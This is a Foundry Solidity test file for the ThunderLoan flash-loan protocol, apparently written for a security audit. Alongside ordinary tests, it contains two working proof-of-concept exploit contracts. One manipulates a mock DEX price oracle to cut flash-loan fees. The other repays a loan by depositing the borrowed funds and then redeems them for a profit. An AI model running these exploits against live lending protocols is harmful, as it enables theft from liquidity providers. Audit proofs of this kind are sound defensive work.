// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console2 } from "forge-std/Test.sol";
import { BaseTest, ThunderLoan, ERC20Mock, ERC1967Proxy } from "./BaseTest.t.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";
import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
import { BuffMockPoolFactory } from "../mocks/BuffMockPoolFactory.sol";
import { BuffMockTSwap } from "../mocks/BuffMockTSwap.sol";
import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
    address liquidityProvider = address(123);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    function testInitializationOwner() public {
        assertEq(thunderLoan.owner(), address(this));
    }

    function testSetAllowedTokens() public {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        assertEq(thunderLoan.isAllowedToken(tokenA), true);
    }

    function testOnlyOwnerCanSetTokens() public {
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.setAllowedToken(tokenA, true);
    }

    function testSettingTokenCreatesAsset() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);
        assertEq(address(thunderLoan.getAssetFromToken(tokenA)), address(assetToken));
    }

    function testCantDepositUnapprovedTokens() public {
        tokenA.mint(liquidityProvider, AMOUNT);
        tokenA.approve(address(thunderLoan), AMOUNT);
        vm.expectRevert(abi.encodeWithSelector(ThunderLoan.ThunderLoan__NotAllowedToken.selector, address(tokenA)));
        thunderLoan.deposit(tokenA, AMOUNT);
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    function testDepositMintsAssetAndUpdatesBalance() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), AMOUNT);
        assertEq(asset.balanceOf(liquidityProvider), AMOUNT);
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        console2.log("Depositing");
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    function testFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        assertEq(mockFlashLoanReceiver.getBalanceDuring(), amountToBorrow + AMOUNT);
        assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);
    }

    function testRedeem() public setAllowedToken hasDeposits {
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, type(uint256).max);
        vm.stopPrank();
        assertEq(tokenA.balanceOf(liquidityProvider), DEPOSIT_AMOUNT);
    }

    function testGetCalculatedFeeIsPointThreePercent() public setAllowedToken {
        // Given: MockTSwapPool returns price of 1e18 (1:1 ratio)
        // s_flashLoanFee = 3e15
        // s_feePrecision = 1e18
        // Expected fee = amount * 3e15 / 1e18 = amount * 0.003 = 0.3%

        uint256 amountToBorrow = 100e18; // 100 tokens
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        // Manual calculation: 0.3% of 100e18 = 100e18 * 3 / 1000 = 0.3e18
        uint256 expectedFee = amountToBorrow * 3 / 1000;

        assertEq(calculatedFee, expectedFee, "Fee should be exactly 0.3%");
    }

    function testOracleManipulation() public {

        uint256 amountToBorrow = 50e18; // We gonna take this twice
        // Set up contracts
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));

        // Create TSwap DEX betweeen WETH and TokenA
        address tswapPool = pf.createPool(address(tokenA));

        // Initialize ThunderLoan
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf));

        // Fund Tswap
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(address(tswapPool), 100e18);
        weth.mint(liquidityProvider, 100e18);
        weth.approve(address(tswapPool), 100e18);
        // Ratio 1:1 (1 WETH = 1 TokenA)
        BuffMockTSwap(tswapPool).deposit(
            100e18, 
            100e18, 
            100e18, 
            block.timestamp
        );
        vm.stopPrank();

        // Fund ThunderLoan
        // Set tokenA as allowed
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        // Fund ThunderLoan with 1000 tokenA
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18);
        vm.stopPrank();

        // There is 100 WETH and 100 tokenA in Tswap
        // There is 1000 tokenA in ThunderLoan

        // Take out a flash loan of 50 tokenA
        // Swap them on the Tswap, tanking the price -> 150 tokenA -> Low value of ETH

        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, amountToBorrow * 2);
        console2.log("Normal fee cost is", normalFeeCost);
        // Normal fee cost is 296147410319118389 -> 0.296147410319118389 tokenA;

        // Taking 2 flash loans
        //      a) To nuke the price of WETH/TokenA on Tswap
        //      b) To show that is posible to take a new flash loan with a reduced price fee on ThunderLoan

        MaliciousFlashLoanReceiver maliciousFlashLoanReceiver = new MaliciousFlashLoanReceiver(
            tswapPool,
            address(thunderLoan),
            address(thunderLoan.getAssetFromToken(tokenA)),
            amountToBorrow
        );

        vm.startPrank(user);
        // Mint tokenA to repay the fee
        tokenA.mint(address(maliciousFlashLoanReceiver), 100e18);

        // Take the first flash loan
        thunderLoan.flashloan(address(maliciousFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        // Get the actual fee cost
        uint256 actualFeeCost = maliciousFlashLoanReceiver.feeOne() + maliciousFlashLoanReceiver.feeTwo();
        console2.log("Actual fee cost is", actualFeeCost);

        // Assert
        assert(actualFeeCost < normalFeeCost);
    }

    function testDepositInsteadOfRepay() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = 50e18; // We gonna take this twice

        DepositInsteadOfRepay depositInsteadOfRepay = new DepositInsteadOfRepay(
            address(thunderLoan),
            amountToBorrow
        );

        vm.startPrank(user);
        // Mint tokenA to repay the fee
        tokenA.mint(address(depositInsteadOfRepay), 1e18);

        bytes memory params = abi.encode(address(user));
        // Take the flash loan
        thunderLoan.flashloan(address(depositInsteadOfRepay), tokenA, amountToBorrow, params);

        // Check balance of assets before redeem
        uint256 assetBalanceBeforeRedeem = IERC20(tokenA).balanceOf(user);
        console2.log("TokenA balance before redeem", assetBalanceBeforeRedeem);

        // Redeem the shares
        thunderLoan.redeem(IERC20(tokenA), type(uint256).max);
        
        // Check balance of assets after redeem
        uint256 assetBalanceAfterRedeem = IERC20(tokenA).balanceOf(user);
        console2.log("TokenA balance after redeem", assetBalanceAfterRedeem);

        vm.stopPrank();

        assert(assetBalanceAfterRedeem > assetBalanceBeforeRedeem);

    }
}

contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {

    ThunderLoan thunderLoan;
    address repayAddress;
    BuffMockTSwap tswapPool;
    bool attacked;
    uint256 public feeOne;
    uint256 public feeTwo;
    uint256 amountToBorrow;

    error FailedToRepayTheFlashLoan(bool attacked);

    constructor (address _tswapPoolAddress, address _thunderLoanAddress, address _repayAddress, uint256 _amountToBorrow) {
        tswapPool = BuffMockTSwap(_tswapPoolAddress);
        thunderLoan = ThunderLoan(_thunderLoanAddress);
        repayAddress = _repayAddress;
        amountToBorrow = _amountToBorrow;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata params
    )
    external
    returns (bool) {
        if (!attacked) {
            feeOne = fee;
            attacked = true;
            // 1. Swap TokenA borrowed for WETH
            uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(amountToBorrow, 100e18, 100e18);
            
            IERC20(token).approve(address(tswapPool), amount);

            tswapPool.swapPoolTokenForWethBasedOnOutputWeth(wethBought, amount, block.timestamp);
            // 2. Take out ANOTHER flash loan to show the difference in fees
            thunderLoan.flashloan(address(this), IERC20(token), amountToBorrow, "");
            // 3. Repay the first flash loan
            // IERC20(token).approve(address(thunderLoan), amountToBorrow + fee);
            // thunderLoan.repay(IERC20(token), amountToBorrow + fee);
            // Instead of call repay function, we gonna call transfer
            bool success = IERC20(token).transfer(repayAddress, amount + feeOne);
            if (!success) {
                revert FailedToRepayTheFlashLoan(attacked);
            }
        }
        else {
            // Calculate the fee and repay the flash loan
            feeTwo = fee;
            // Repay the second flash loan
            // IERC20(token).approve(address(thunderLoan), amountToBorrow + fee);
            // thunderLoan.repay(IERC20(token), amountToBorrow + fee);
            // Instead of call repay function, we gonna call transfer
            bool success = IERC20(token).transfer(repayAddress, amount + feeTwo);
            if (!success) {
                revert FailedToRepayTheFlashLoan(attacked);
            }
        }
        return true;
    }
}

contract DepositInsteadOfRepay is IFlashLoanReceiver {

    ThunderLoan thunderLoan;
    uint256 amountToBorrow;

    error FailedToRepayTheFlashLoan(bool attacked);

    constructor (address _thunderLoanAddress, uint256 _amountToBorrow) {
        thunderLoan = ThunderLoan(_thunderLoanAddress);
        amountToBorrow = _amountToBorrow;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata params
    )
    external
    returns (bool) {

        IERC20 assetToken = IERC20(address(thunderLoan.getAssetFromToken(IERC20(token))));

        address caller = abi.decode(params, (address));

        IERC20(token).approve(address(thunderLoan), amountToBorrow + fee);
        thunderLoan.deposit(IERC20(token), amountToBorrow + fee);

        // Send the shares to the caller address for redeeming
        assetToken.transfer(caller, assetToken.balanceOf(address(this)));
        
        return true;
    }
}